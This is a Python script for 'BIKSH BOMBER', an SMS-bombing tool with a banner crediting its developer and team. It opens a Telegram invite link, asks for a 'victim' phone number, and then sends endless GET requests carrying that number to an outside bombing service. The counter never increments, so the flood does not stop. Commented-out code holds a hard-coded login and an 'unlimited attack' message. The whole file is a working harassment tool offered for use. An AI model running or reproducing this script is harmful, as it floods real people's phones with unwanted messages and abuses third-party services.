import os
import time

os.system("clear")
time.sleep(0.5)

print("""

\033[1;34m
██████╗ ██╗██╗  ██╗███████╗██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║██║ ██╔╝██╔════╝██║  ██║    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║█████╔╝ ███████╗███████║    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║██╔═██╗ ╚════██║██╔══██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝██║██║  ██╗███████║██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                        
\033[1;32m_______________________________________________
\033[1;31mWellcome to Our Powerful BIKSH BOMBER Tools🔥
\033[1;32mThis Tools Developer By MD HASIB
__________________________________________________
||||||||                            ||||||||
||||||||                            ||||||||
||||||||                            ||||||||
||||||||                            ||||||||
================================================
\033[1;33mDEVELOPER ▶ MD HASIB
TEAM ▶︎RF CYBER FORCE
CHANNEL  ▶︎RF PROGRAMING HUB
TOOLS NAME  ▶BIKSH BOMBER
================================================
""")

os.system('xdg-open https://t.me/+n-KPxPtkjiI1M2I1 ')

#import sys
#use=input("Enter Username :")
#pas=input("Enter Password :")

#if use=="SMS BOMBER" and pas=="MD HASIB":
#    print("Login Successful..")
#else:
#        print("username or password wrong please try again")
#        sys.exit()
#        
#import os
#import time

#os.system("clear")
#time.sleep(0.5)

              
import requests 

namber=input('\033[1;32mEnter Victim Biksh Number :')
amount=int(input("Enter Amount :"))

sent=0
while sent<amount:
    
   a=requests.get("https://bj-x-coder.top/bo_m_ber.php?phone="+namber)                                                                                      
 
   print("Attack Started Successfully Done👿👻")
pass
       
#       
#import os
#import time

#os.system("clear")
#time.sleep(0.5)

#print("Unlimited Attack Started Successful This Attack Stop🛑{Terminal CTRL+Z} Enjoy This Tools👻👻")      
                                                                                                       
                                                                                                       
                                                                                                       
                                                                                                       
                                                                                                       
                                                                                                       
                                        